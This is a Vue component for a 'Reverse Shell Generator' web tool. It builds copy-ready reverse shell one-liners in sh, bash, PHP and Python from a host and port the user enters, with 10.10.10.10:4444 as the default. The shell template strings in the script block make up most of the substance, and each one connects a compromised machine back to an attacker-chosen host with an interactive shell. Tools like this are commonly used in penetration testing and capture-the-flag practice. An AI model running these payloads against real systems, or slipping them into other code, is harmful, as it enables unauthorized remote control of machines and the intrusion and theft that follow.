<script setup lang="ts">
import { ref } from 'vue'

const host = ref('10.10.10.10')
const port = ref('4444')
const copied = ref<string | null>(null)

const shells: Record<string, (h: string, p: string) => string> = {
  sh: (h, p) => `sh -i >& /dev/tcp/${h}/${p} 0>&1`,
  bash: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
  php: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  python: (h, p) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
}

const activeTab = ref('sh')

async function copyToClipboard(text: string, type: string) {
  try {
    await navigator.clipboard.writeText(text)
    copied.value = type
    setTimeout(() => { copied.value = null }, 2000)
  } catch { /* ignore */ }
}
</script>

<template>
  <div class="card w-full p-6 space-y-6">
    <div class="space-y-1">
      <h1 class="text-2xl font-800 text-link">Reverse Shell Generator</h1>
      <p class="text-sm text-neutral-400">Generate reverse shell payloads for various languages</p>
    </div>

    <div class="grid grid-cols-2 gap-4">
      <div class="space-y-2">
        <label for="host" class="text-sm text-main">Host/IP</label>
        <input id="host" v-model="host" type="text" placeholder="10.10.10.10" class="input" />
      </div>
      <div class="space-y-2">
        <label for="port" class="text-sm text-main">Port</label>
        <input id="port" v-model="port" type="text" placeholder="4444" class="input" />
      </div>
    </div>

    <div class="flex gap-2 border-b border-neutral-700/50 pb-2">
      <button
        v-for="key in Object.keys(shells)"
        :key="key"
        @click="activeTab = key"
        :class="[
          'px-3 py-1.5 text-sm rd-1 transition-all duration-200 cursor-pointer decoration-none border-none',
          activeTab === key
            ? 'text-link op-100 bg-neutral-700/30'
            : 'text-link op-60 hover:op-100'
        ]"
      >
        {{ key === 'bash' ? 'Bash' : key.toUpperCase() }}
      </button>
    </div>

    <div v-for="(generator, key) in shells" :key="key" v-show="activeTab === key" class="relative">
      <pre class="bg-hex-161b22 rd-1 p-4 text-sm font-mono whitespace-pre-wrap break-all overflow-x-auto"><code>{{ host && port ? generator(host, port) : 'Enter host and port to generate payload' }}</code></pre>
      <button
        v-if="host && port"
        @click="copyToClipboard(generator(host, port), key)"
        class="absolute top-2 right-2 btn-ghost h-7 w-7 p-0"
      >
        <i v-if="copied === key" class="i-mdi-check text-green-500" />
        <i v-else class="i-mdi-content-copy" />
      </button>
    </div>
  </div>
</template>
